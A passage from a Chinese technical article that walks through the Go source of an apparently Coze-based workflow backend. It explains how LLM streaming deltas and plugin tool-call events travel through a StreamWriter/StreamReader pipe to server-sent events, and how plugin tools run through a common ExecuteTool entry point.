                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowMessageDelta), Data: deltaData},
                }, <span class="hljs-literal">nil</span>
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 完成输出：返回 delta + completed 事件</span>
                <span class="hljs-keyword">return</span> []*workflow.ChatFlowRunResponse{
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowMessageDelta), Data: deltaData},
                    {Event: <span class="hljs-type">string</span>(vo.ChatFlowMessageCompleted), Data: completeData},
                }, <span class="hljs-literal">nil</span>
            }
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, schema.ErrNoValue  <span class="hljs-comment">// 跳过该消息</span>
    }
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>schema.ErrNoValue</code> 表示跳过该消息，不会发送给前端</li>
<li>增量消息（<code>msg.Last == false</code>）只发送 <code>delta</code> 事件</li>
<li>完成消息（<code>msg.Last == true</code>）发送 <code>delta</code> + <code>completed</code> 事件</li>
</ul>
<h4 data-id="heading-30">4.3.5 Workflow 引擎创建 StreamWriter</h4>
<p>代码位置：<code>backend/domain/workflow/service/executable_impl.go:454</code></p>
<p>创建 StreamWriter/StreamReader Pipe，并将 StreamWriter 绑定到执行上下文：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(i *impl)</span></span> StreamExecute(ctx context.Context, config workflowModel.ExecuteConfig, input <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any) 
    (*schema.StreamReader[*entity.Message], <span class="hljs-type">error</span>) {
    
    <span class="hljs-comment">// 1. 获取 Workflow 实体并转换为 WorkflowSchema</span>
    wfEntity, err := i.Get(ctx, &amp;vo.GetPolicy{...})
    workflowSC, err := adaptor.CanvasToWorkflowSchema(ctx, c)
    
    <span class="hljs-comment">// 2. 创建 Workflow 对象（编译节点为可执行的 Runner）</span>
    wf, err := compose.NewWorkflow(ctx, workflowSC, wfOpts...)
    
    <span class="hljs-comment">// 3. 创建 StreamWriter 和 StreamReader（Pipe）</span>
    sr, sw := schema.Pipe[*entity.Message](<span class="hljs-number">10</span>)  <span class="hljs-comment">// 缓冲区大小为 10</span>
    
    <span class="hljs-comment">// 4. 准备执行上下文（传入 StreamWriter）</span>
    cancelCtx, executeID, opts, _, err := compose.NewWorkflowRunner(
        wfEntity.GetBasic(), workflowSC, config,
        compose.WithStreamWriter(sw),  <span class="hljs-comment">// StreamWriter 传入 WorkflowRunner</span>
    ).Prepare(ctx)
    
    <span class="hljs-comment">// 5. 异步执行 Workflow（StreamWriter 会通过回调实时发送消息）</span>
    wf.AsyncRun(cancelCtx, input, opts...)
    
    <span class="hljs-comment">// 6. 返回 StreamReader（应用层会从这个 Reader 接收消息）</span>
    <span class="hljs-keyword">return</span> sr, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>schema.Pipe[*entity.Message](10)</code> 创建一对 StreamWriter/StreamReader，通过 channel buffer 连接</li>
<li><code>compose.WithStreamWriter(sw)</code> 将 StreamWriter 传入 WorkflowRunner，最终绑定到执行上下文</li>
<li><code>wf.AsyncRun()</code> 异步执行，不会阻塞；消息通过 StreamWriter 实时发送</li>
<li>返回的 <code>sr</code> 是 StreamReader，应用层通过 <code>sr.Recv()</code> 接收消息</li>
</ul>
<h4 data-id="heading-31">4.3.6 StreamWriter 绑定到执行上下文</h4>
<p>代码位置：<code>backend/domain/workflow/internal/compose/workflow_run.go:107</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *WorkflowRunner)</span></span> Prepare(ctx context.Context) (...) {
    <span class="hljs-comment">// 1. 生成执行 ID</span>
    executeID, err := repo.GenID(ctx)
    
    <span class="hljs-comment">// 2. 构建执行选项（包含回调处理器，传入 StreamWriter）</span>
    composeOpts, err := r.designateOptions(ctx)
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>代码位置：<code>backend/domain/workflow/internal/compose/designate_option.go:40</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *WorkflowRunner)</span></span> designateOptions(ctx context.Context) ([]einoCompose.Option, <span class="hljs-type">error</span>) {
    streamWriter := r.sw  <span class="hljs-comment">// 从 WorkflowRunner 获取 StreamWriter</span>
    
    <span class="hljs-comment">// 创建根回调处理器（传入 StreamWriter）</span>
    rootHandler := execute.NewRootWorkflowHandler(
        <span class="hljs-comment">// ...</span>
        streamWriter,  <span class="hljs-comment">// StreamWriter 传入回调处理器</span>
    )
    
    opts := []einoCompose.Option{einoCompose.WithCallbacks(rootHandler)}
    
    <span class="hljs-comment">// 为每个节点添加回调处理器</span>
    <span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> workflowSC.GetAllNodes() {
        ns := workflowSC.GetAllNodes()[key]
        <span class="hljs-keyword">if</span> ns.Type == entity.NodeTypeLLM {
            <span class="hljs-comment">// 为 LLM 节点添加工具回调选项</span>
            llmNodeOpts, err := llmToolCallbackOptions(ctx, ns, eventChan, container)
            opts = <span class="hljs-built_in">append</span>(opts, llmNodeOpts...)
        }
    }
    
    <span class="hljs-keyword">return</span> opts, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>代码位置：<code>backend/domain/workflow/internal/execute/callback.go:76</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewRootWorkflowHandler</span><span class="hljs-params">(..., streamWriter *schema.StreamWriter[*entity.Message])</span></span> callbacks.Handler {
    <span class="hljs-keyword">return</span> &amp;WorkflowHandler{
        <span class="hljs-comment">// ...</span>
        streamWriter: streamWriter,  <span class="hljs-comment">// 保存 StreamWriter</span>
    }
}
</code></pre>
<p>说明：</p>
<ul>
<li>StreamWriter 通过 <code>designateOptions</code> 传入根回调处理器（<code>WorkflowHandler</code>）</li>
<li><code>WorkflowHandler</code> 将 StreamWriter 保存到执行上下文（<code>exeCtx.RootCtx.StreamWriter</code>）</li>
<li>LLM 节点在执行时可以从执行上下文获取 StreamWriter</li>
</ul>
<h4 data-id="heading-32">4.3.7 LLM 节点构建（准备工具列表）</h4>
<p>LLM 节点在构建时（<code>Build</code> 方法）准备工具列表和回调处理器，这是 Function Calling 的基础。</p>
<p>代码位置：<code>backend/domain/workflow/internal/nodes/llm/llm.go:385</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Config)</span></span> Build(ctx context.Context, ns *schema2.NodeSchema, _ ...schema2.BuildOption) (any, <span class="hljs-type">error</span>) {
    <span class="hljs-keyword">var</span> (
        tools                 []tool.BaseTool
        toolCallbackHandler   callbacks.Handler
        llmRef                *LLM  <span class="hljs-comment">// 引用（用于回调访问 realtimeWriter）</span>
    )
    
    <span class="hljs-comment">// 1. 构建 ChatModel</span>
    chatModel, info, err := modelbuilder.BuildModelByID(ctx, c.LLMParams.ModelType, ...)
    
    <span class="hljs-comment">// 2. 处理 Function Calling 参数（构建插件工具列表）</span>
    fcParams := c.FCParam
    <span class="hljs-keyword">if</span> fcParams != <span class="hljs-literal">nil</span> &amp;&amp; fcParams.PluginFCParam != <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">// 2.1 构建插件工具请求</span>
        pluginToolsInvokableReq := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int64</span>]*wrapPlugin.ToolsInvokableRequest)
        <span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> fcParams.PluginFCParam.PluginList {
            pid, _ := strconv.ParseInt(p.PluginID, <span class="hljs-number">10</span>, <span class="hljs-number">64</span>)
            toolID, _ := strconv.ParseInt(p.ApiId, <span class="hljs-number">10</span>, <span class="hljs-number">64</span>)
            <span class="hljs-comment">// ... 构建请求 ...</span>
        }
        
        <span class="hljs-comment">// 2.2 获取插件工具列表（转换为 InvokableTool）</span>
        inInvokableTools := <span class="hljs-built_in">make</span>([]tool.BaseTool, <span class="hljs-number">0</span>)
        <span class="hljs-keyword">for</span> _, req := <span class="hljs-keyword">range</span> pluginToolsInvokableReq {
            toolMap, err := wrapPlugin.GetPluginInvokableTools(ctx, req)
            <span class="hljs-keyword">for</span> _, t := <span class="hljs-keyword">range</span> toolMap {
                inInvokableTools = <span class="hljs-built_in">append</span>(inInvokableTools, newInvokableTool(t))
            }
        }
    <span class="hljs-comment">// 执行 funcation calling 时 eino 框架会调用 tool.InvokableRun 函数</span>
        tools = <span class="hljs-built_in">append</span>(tools, inInvokableTools...)
    }
    
    <span class="hljs-comment">// 3. 构建 LLM Graph</span>
    g := compose.NewGraph[<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any, <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any](...)
    
    <span class="hljs-comment">// 4. 根据是否有工具选择不同的节点类型</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tools) &gt; <span class="hljs-number">0</span> {
        <span class="hljs-comment">// 4.1 有工具：创建 React Agent（ReAct 模式）</span>
        m, ok := modelWithInfo.(model.ToolCallingChatModel)
        reactConfig := react.AgentConfig{
            ToolCallingModel: m,
            ToolsConfig:      compose.ToolsNodeConfig{Tools: tools},  <span class="hljs-comment">// 传入工具列表</span>
            MaxStep:          <span class="hljs-number">100</span>,
        }
        reactAgent, err := react.NewAgent(ctx, &amp;reactConfig)
        agentNode, opts := reactAgent.ExportGraph()
        _ = g.AddGraphNode(llmNodeKey, agentNode, opts...)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 4.2 无工具：直接添加 ChatModel 节点</span>
        _ = g.AddChatModelNode(llmNodeKey, modelWithInfo)
    }
    
    <span class="hljs-comment">// 5. 创建工具回调处理器（用于实时流式输出）</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tools) &gt;= <span class="hljs-number">0</span> {
        toolCallbackHandler = callbacks2.NewHandlerHelper().
            ChatModel(&amp;callbacks2.ModelCallbackHandler{
                OnEndWithStreamOutput: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, info *callbacks.RunInfo, 
                    output *schema.StreamReader[*model.CallbackOutput])</span></span> context.Context {
                    <span class="hljs-comment">// 流式输出处理，发送实时消息</span>
                    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
                        <span class="hljs-keyword">for</span> {
                            frame, err := output.Recv()
                            <span class="hljs-keyword">if</span> errors.Is(err, io.EOF) {
                                <span class="hljs-keyword">break</span>
                            }
                            <span class="hljs-keyword">if</span> frame.Message.Content != <span class="hljs-string">""</span> {
                                <span class="hljs-comment">//  实时发送消息到 StreamWriter</span>
                                <span class="hljs-keyword">if</span> llmRef != <span class="hljs-literal">nil</span> &amp;&amp; llmRef.realtimeWriter != <span class="hljs-literal">nil</span> {
                                    dataMsg := &amp;entity.DataMessage{
                                        Type:      entity.Answer,
                                        Content:   frame.Message.Content,  <span class="hljs-comment">// 增量内容（如 "被"）</span>
                                        <span class="hljs-comment">// ...</span>
                                    }
                                    llmRef.realtimeWriter.Send(&amp;entity.Message{DataMessage: dataMsg}, <span class="hljs-literal">nil</span>)
                                }
                            }
                        }
                    }()
                    <span class="hljs-keyword">return</span> ctx
                },
            }).
            Tool(&amp;callbacks2.ToolCallbackHandler{
                OnStart: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, info *callbacks.RunInfo, input *tool.CallbackInput)</span></span> context.Context {
                    <span class="hljs-comment">//  发送工具调用开始事件</span>
                    <span class="hljs-keyword">if</span> llmRef != <span class="hljs-literal">nil</span> &amp;&amp; llmRef.realtimeWriter != <span class="hljs-literal">nil</span> {
                        <span class="hljs-comment">// ... 构建 FunctionCall 消息 ...</span>
                        llmRef.realtimeWriter.Send(&amp;entity.Message{DataMessage: dataMsg}, <span class="hljs-literal">nil</span>)
                    }
                    <span class="hljs-keyword">return</span> ctx
                },
                OnEnd: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, info *callbacks.RunInfo, output *tool.CallbackOutput)</span></span> context.Context {
                    <span class="hljs-comment">//  发送工具调用结束事件</span>
                    <span class="hljs-keyword">if</span> llmRef != <span class="hljs-literal">nil</span> &amp;&amp; llmRef.realtimeWriter != <span class="hljs-literal">nil</span> {
                        <span class="hljs-comment">// ... 构建 ToolResponse 消息 ...</span>
                        llmRef.realtimeWriter.Send(&amp;entity.Message{DataMessage: dataMsg}, <span class="hljs-literal">nil</span>)
                    }
                    <span class="hljs-keyword">return</span> ctx
                },
            }).Handler()
    }
    
    <span class="hljs-comment">// 6. 编译 Graph 为可执行的 Runner</span>
    r, err := g.Compile(ctx, compileOpts...)
    
    <span class="hljs-comment">// 7. 创建 LLM 节点实例</span>
    llm := &amp;LLM{
        r:                   r,
        toolCallbackHandler: toolCallbackHandler,  <span class="hljs-comment">// 保存回调处理器</span>
    }
    
    <span class="hljs-comment">// 8. 设置引用，使回调可以访问 realtimeWriter</span>
    llmRef = llm
    
    <span class="hljs-keyword">return</span> llm, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><strong>工具列表构建</strong>：从 <code>FCParam.PluginFCParam.PluginList</code> 解析插件配置，调用 <code>wrapPlugin.GetPluginInvokableTools()</code> 获取工具</li>
<li><strong>React Agent</strong>：如果有工具，创建 React Agent（ReAct 模式），否则使用普通 ChatModel</li>
<li><strong>回调处理器</strong>：在构建时创建 <code>toolCallbackHandler</code>，包含 <code>ChatModel.OnEndWithStreamOutput</code> 和 <code>Tool.OnStart/OnEnd</code> 回调</li>
<li><strong>llmRef 引用</strong>：通过 <code>llmRef</code> 引用，回调处理器可以访问 <code>llmRef.realtimeWriter</code>（在执行时设置）</li>
</ul>
<h4 data-id="heading-33">4.3.8 LLM 节点执行（获取 StreamWriter）</h4>
<p>代码位置：<code>backend/domain/workflow/internal/nodes/llm/llm.go:1455</code></p>
<p>LLM 节点在执行时（<code>Stream</code> 方法）从执行上下文获取 StreamWriter，并设置到 <code>llmRef.realtimeWriter</code>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(l *LLM)</span></span> Stream(ctx context.Context, in <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any, opts ...nodes.NodeOption) 
    (out *schema.StreamReader[<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any], err <span class="hljs-type">error</span>) {
    
    <span class="hljs-comment">// 1. 准备执行选项</span>
    composeOpts, resumingEvent, err := l.prepare(ctx, in, opts...)
    
    <span class="hljs-comment">// 2. 从执行上下文获取 StreamWriter</span>
    exeCtx := execute.GetExeCtx(ctx)
    <span class="hljs-keyword">if</span> exeCtx != <span class="hljs-literal">nil</span> &amp;&amp; exeCtx.RootCtx.StreamWriter != <span class="hljs-literal">nil</span> {
        l.realtimeWriter = exeCtx.RootCtx.StreamWriter  <span class="hljs-comment">// 设置到 LLM 实例</span>
        logs.Infof(<span class="hljs-string">"✅ [LLM Stream] Found StreamWriter in execute context"</span>)
    }
    
    <span class="hljs-comment">// 3. 添加工具回调处理器（回调会使用 realtimeWriter 发送消息）</span>
    <span class="hljs-keyword">if</span> l.toolCallbackHandler != <span class="hljs-literal">nil</span> {
        composeOpts = <span class="hljs-built_in">append</span>(composeOpts, compose.WithCallbacks(l.toolCallbackHandler))
    }
    
    <span class="hljs-comment">// 4. 调用 LLM Graph 的 Stream 方法（如果 LLM 生成 Function Call，会自动调用工具）</span>
    out, err = l.r.Stream(ctx, in, composeOpts...)
    
    <span class="hljs-keyword">return</span> out, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>execute.GetExeCtx(ctx)</code> 获取执行上下文，其中包含 <code>RootCtx.StreamWriter</code></li>
<li><code>l.realtimeWriter = exeCtx.RootCtx.StreamWriter</code> 将 StreamWriter 设置到 LLM 实例</li>
<li>回调处理器（在 Build 时创建）通过 <code>llmRef.realtimeWriter</code> 访问 StreamWriter</li>
<li>当 LLM 流式输出或工具调用时，回调处理器会调用 <code>llmRef.realtimeWriter.Send()</code> 发送消息</li>
</ul>
<h4 data-id="heading-34">4.3.9 消息发送时机</h4>
<p>代码位置：<code>backend/domain/workflow/internal/nodes/llm/llm.go:877</code></p>
<p>回调处理器在以下时机调用 <code>llmRef.realtimeWriter.Send()</code>：</p>
<p><strong>1. LLM 流式输出时</strong>（<code>ChatModel.OnEndWithStreamOutput</code>）：</p>
<pre><code class="hljs language-go" lang="go">ChatModel(&amp;callbacks2.ModelCallbackHandler{
    OnEndWithStreamOutput: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, info *callbacks.RunInfo, 
        output *schema.StreamReader[*model.CallbackOutput])</span></span> context.Context {
        
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
            <span class="hljs-keyword">for</span> {
                frame, err := output.Recv()  <span class="hljs-comment">// 从 LLM 流式输出接收</span>
                <span class="hljs-keyword">if</span> errors.Is(err, io.EOF) {
                    <span class="hljs-keyword">break</span>
                }
                
                <span class="hljs-keyword">if</span> frame.Message.Content != <span class="hljs-string">""</span> {
                    <span class="hljs-comment">//  实时发送消息到 StreamWriter</span>
                    <span class="hljs-keyword">if</span> llmRef != <span class="hljs-literal">nil</span> &amp;&amp; llmRef.realtimeWriter != <span class="hljs-literal">nil</span> {
                        dataMsg := &amp;entity.DataMessage{
                            Type:      entity.Answer,
                            Content:   frame.Message.Content,  <span class="hljs-comment">// 增量内容（如 "被"）</span>
                            NodeType:  entity.NodeTypeLLM,
                            ExecuteID: exeCtx.RootExecuteID,
                            NodeID:    <span class="hljs-type">string</span>(exeCtx.NodeKey),
                        }
                        <span class="hljs-comment">// 发送到 StreamWriter（写入 channel buffer）</span>
                        llmRef.realtimeWriter.Send(&amp;entity.Message{DataMessage: dataMsg}, <span class="hljs-literal">nil</span>)
                    }
                }
            }
        }()
        <span class="hljs-keyword">return</span> ctx
    },
})
</code></pre>
<p><strong>2. 工具调用开始时</strong>（<code>Tool.OnStart</code>）：</p>
<pre><code class="hljs language-go" lang="go">Tool(&amp;callbacks2.ToolCallbackHandler{
    OnStart: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, info *callbacks.RunInfo, input *tool.CallbackInput)</span></span> context.Context {
        <span class="hljs-comment">//  发送工具调用开始事件</span>
        <span class="hljs-keyword">if</span> llmRef != <span class="hljs-literal">nil</span> &amp;&amp; llmRef.realtimeWriter != <span class="hljs-literal">nil</span> {
            dataMsg := &amp;entity.DataMessage{
                Type:      entity.FunctionCall,
                FunctionCall: &amp;entity.FunctionCallInfo{
                    Name:      info.Name,
                    CallID:    compose.GetToolCallID(ctx),
                    Arguments: parseArguments(input.ArgumentsInJSON),
                },
            }
            <span class="hljs-comment">// 发送到 StreamWriter</span>
            llmRef.realtimeWriter.Send(&amp;entity.Message{DataMessage: dataMsg}, <span class="hljs-literal">nil</span>)
        }
        <span class="hljs-keyword">return</span> ctx
    },
})
</code></pre>
<p><strong>3. 工具调用结束时</strong>（<code>Tool.OnEnd</code>）：</p>
<pre><code class="hljs language-go" lang="go">OnEnd: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, info *callbacks.RunInfo, output *tool.CallbackOutput)</span></span> context.Context {
    <span class="hljs-comment">//  发送工具调用结束事件</span>
    <span class="hljs-keyword">if</span> llmRef != <span class="hljs-literal">nil</span> &amp;&amp; llmRef.realtimeWriter != <span class="hljs-literal">nil</span> {
        dataMsg := &amp;entity.DataMessage{
            Type:      entity.ToolResponse,
            ToolResponse: &amp;entity.ToolResponseInfo{
                Name:     info.Name,
                CallID:   compose.GetToolCallID(ctx),
                Response: output.OutputInJSON,
            },
        }
        <span class="hljs-comment">// 发送到 StreamWriter</span>
        llmRef.realtimeWriter.Send(&amp;entity.Message{DataMessage: dataMsg}, <span class="hljs-literal">nil</span>)
    }
    <span class="hljs-keyword">return</span> ctx
},
</code></pre>
<p>说明：</p>
<ul>
<li><code>llmRef.realtimeWriter.Send()</code> 将消息写入 Pipe 的 channel buffer</li>
<li>消息会立即被 StreamReader 接收（如果应用层正在 <code>Recv()</code>）</li>
<li>回调处理器在独立的 goroutine 中运行，不会阻塞 LLM 执行</li>
</ul>
<h4 data-id="heading-35">4.3.10 消息接收与 SSE 发送</h4>
<h5 data-id="heading-36">1. 消息接收路径</h5>
<p>完整路径：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[llmRef.realtimeWriter&lt;br/&gt;Send msg, nil] --&gt;|写入| B[Channel Buffer]
    B --&gt;|Recv| C[StreamReader&lt;br/&gt;Workflow 层]
    C --&gt;|应用层循环接收| D[应用层转换函数&lt;br/&gt;convertToChatFlowRunResponseList]
    D --&gt;|转换为 SSE 格式| E[StreamReader&lt;br/&gt;SSE 层]
    E --&gt;|Handler 层循环接收| F[SSE Writer&lt;br/&gt;Write event]
    F --&gt;|发送| G[前端 SSE 连接]
    
    style A fill:#e1f5ff
    style B fill:#ffe1f5
    style C fill:#fff4e1
    style D fill:#e1ffe1
    style E fill:#fff4e1
    style F fill:#ffe1f5
    style G fill:#e1f5ff
</code></pre>
<p>代码位置：<code>backend/application/workflow/chatflow.go:918</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 应用层调用领域服务执行 Workflow（返回 StreamReader）</span>
sr, err := GetWorkflowDomainSVC().StreamExecute(ctx, exeCfg, parameters)

<span class="hljs-comment">// 将 Workflow 消息 StreamReader 转换为 SSE 响应 StreamReader</span>
<span class="hljs-keyword">return</span> schema.StreamReaderWithConvert(sr, w.convertToChatFlowRunResponseList(ctx, ...)), <span class="hljs-literal">nil</span>
</code></pre>
<p>代码位置：<code>backend/api/handler/coze/workflow_service.go:724</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sendChatFlowStreamRunSSE</span><span class="hljs-params">(ctx context.Context, w *sse.Writer, 
    sr *schema.StreamReader[[]*workflow.ChatFlowRunResponse])</span></span> {
    <span class="hljs-keyword">for</span> {
        <span class="hljs-comment">// 从 StreamReader 接收消息（阻塞等待）</span>
        respList, err := sr.Recv()
        
        <span class="hljs-keyword">if</span> errors.Is(err, io.EOF) {
            <span class="hljs-keyword">break</span>  <span class="hljs-comment">// 流结束</span>
        }
        
        <span class="hljs-comment">// 将每个响应转换为 SSE 事件并发送给前端</span>
        <span class="hljs-keyword">for</span> _, resp := <span class="hljs-keyword">range</span> respList {
            event := &amp;sse.Event{
                ID:   strconv.FormatInt(seq, <span class="hljs-number">10</span>),
                Type: resp.Event,
                Data: []<span class="hljs-type">byte</span>(resp.Data),
            }
            w.Write(event)
            seq++
        }
    }
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>sr.Recv()</code> 阻塞等待，直到有消息写入 StreamWriter</li>
<li><code>StreamReaderWithConvert</code> 在每次 <code>Recv()</code> 时调用转换函数</li>
<li>转换函数将 <code>entity.Message</code> 转换为 <code>ChatFlowRunResponse</code>，包含事件类型和 JSON 数据</li>
<li>SSE Writer 将事件写入 HTTP 响应流，前端通过 EventSource API 接收</li>
</ul>
<h5 data-id="heading-37">2. 消息流转时序图</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant LLMCallback as LLM 回调处理器
    participant SW as StreamWriter
    participant Buffer as Channel Buffer
    participant SR1 as StreamReader (Workflow)
    participant App as 应用层转换
    participant SR2 as StreamReader (SSE)
    participant Handler as Handler 层
    participant Frontend as 前端
    
    Note over LLMCallback: LLM 流式输出
    LLMCallback-&gt;&gt;SW: Send(Message{Content: "被"})
    SW-&gt;&gt;Buffer: 写入 channel buffer
    
    Note over SR1: 应用层循环接收
    SR1-&gt;&gt;Buffer: Recv() (阻塞等待)
    Buffer--&gt;&gt;SR1: Message{Content: "被"}
    SR1-&gt;&gt;App: 转换函数调用
    App-&gt;&gt;App: convertToChatFlowRunResponseList()
    App--&gt;&gt;SR2: ChatFlowRunResponse{Event: "delta", Data: "..."}
    
    Note over Handler: Handler 层循环接收
    SR2-&gt;&gt;Handler: Recv()
    Handler-&gt;&gt;Handler: 构建 SSE Event
    Handler-&gt;&gt;Frontend: Write(event: delta\ndata: {...})
    Frontend--&gt;&gt;Frontend: 显示 "被"
</code></pre>
<h4 data-id="heading-38">4.3.11 插件工具执行（Function Calling）</h4>
<p>当 LLM 生成 Function Call 时，eino 框架自动调用工具的 <code>InvokableRun</code> 方法。</p>
<h5 data-id="heading-39">1. 工具包装器</h5>
<p>代码位置：<code>backend/domain/workflow/internal/nodes/llm/plugin.go:32</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newInvokableTool</span><span class="hljs-params">(pl crossplugin.InvokableTool)</span></span> tool.InvokableTool {
    <span class="hljs-keyword">return</span> &amp;pluginInvokableTool{
        pluginInvokableTool: pl,
    }
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p pluginInvokableTool)</span></span> InvokableRun(ctx context.Context, argumentsInJSON <span class="hljs-type">string</span>, opts ...tool.Option) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">//  获取执行配置（从 Workflow 上下文）</span>
    execCfg := execute.GetExecuteConfig(opts...)
    
    <span class="hljs-comment">//  调用插件服务执行工具</span>
    <span class="hljs-keyword">return</span> p.pluginInvokableTool.PluginInvoke(ctx, argumentsInJSON, execCfg)
}
</code></pre>
<h5 data-id="heading-40">2. 插件工具执行</h5>
<p>代码位置：<code>backend/domain/workflow/plugin/plugin.go:338</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *pluginInvokeTool)</span></span> PluginInvoke(ctx context.Context, argumentsInJSON <span class="hljs-type">string</span>, 
    cfg workflowModel.ExecuteConfig) (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
    
    <span class="hljs-comment">// 1. 构建执行请求</span>
    req := &amp;model.ExecuteToolRequest{
        UserID:          conv.Int64ToStr(cfg.Operator),
        PluginID:        p.pluginEntity.PluginID,
        ToolID:          p.toolInfo.ID,
        ExecScene:       consts.ExecSceneOfWorkflow,
        ArgumentsInJson: argumentsInJSON,  <span class="hljs-comment">// LLM 生成的参数 JSON</span>
    }
    
    <span class="hljs-comment">// 2. 执行工具（统一执行入口）</span>
    r, err := crossplugin.DefaultSVC().ExecuteTool(ctx, req, execOpts...)
    
    <span class="hljs-comment">// 3. 返回裁剪后的响应（JSON 字符串，供 LLM 继续推理）</span>
    <span class="hljs-keyword">return</span> r.TrimmedResp, <span class="hljs-literal">nil</span>
}
</code></pre>
<p>说明：</p>
<ul>
<li><code>argumentsInJSON</code> 是 LLM 根据工具 Schema 生成的参数 JSON</li>
<li><code>ExecuteTool</code> 是统一执行入口，会根据插件类型选择 HTTP/MCP/Custom 执行器</li>
<li><code>TrimmedResp</code> 是根据响应 Schema 裁剪后的 JSON，只包含 LLM 需要的字段</li>
</ul>
<h4 data-id="heading-41">4.3.12 统一执行入口（PluginService.ExecuteTool）</h4>
<p>所有插件执行都通过 <code>PluginService.ExecuteTool()</code> 统一入口，无论插件类型是 HTTP、MCP 还是 Custom。下面分析从统一入口到具体执行器的完整流程。</p>
<h5 data-id="heading-42">1. ExecuteTool 主流程</h5>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *pluginServiceImpl)</span></span> ExecuteTool(ctx context.Context, req *model.ExecuteToolRequest, opts ...model.ExecuteToolOpt) (resp *model.ExecuteToolResponse, err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 解析执行选项</span>
    opt := &amp;model.ExecuteToolOption{}
    <span class="hljs-keyword">for</span> _, fn := <span class="hljs-keyword">range</span> opts {
        fn(opt)
    }
    
    <span class="hljs-comment">// 2. 构建工具执行器（根据执行场景获取插件和工具信息）</span>
    executor, err := p.buildToolExecutor(ctx, req, opt)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errorx.Wrapf(err, <span class="hljs-string">"buildToolExecutor failed"</span>)
    }
    
    <span class="hljs-comment">// 3. 获取认证信息（如果需要 OAuth，会尝试获取 Access Token）</span>
    authInfo := executor.plugin.GetAuthInfo()
    accessToken, authURL, err := p.acquireAccessTokenIfNeed(ctx, req, authInfo, executor.tool.Operation)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errorx.Wrapf(err, <span class="hljs-string">"acquireAccessToken failed"</span>)
    }
    
    <span class="hljs-comment">// 4. 执行工具（调用具体的 Invocation 实现）</span>
    result, err := executor.execute(ctx, req.ArgumentsInJson, accessToken, authURL)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errorx.Wrapf(err, <span class="hljs-string">"execute tool failed"</span>)
    }
    
    <span class="hljs-comment">// 5. 工具调试场景下，更新工具的调试状态</span>
    <span class="hljs-keyword">if</span> req.ExecScene == consts.ExecSceneOfToolDebug {
        err = p.toolRepo.UpdateDraftTool(ctx, &amp;entity.ToolInfo{
            ID:          req.ToolID,
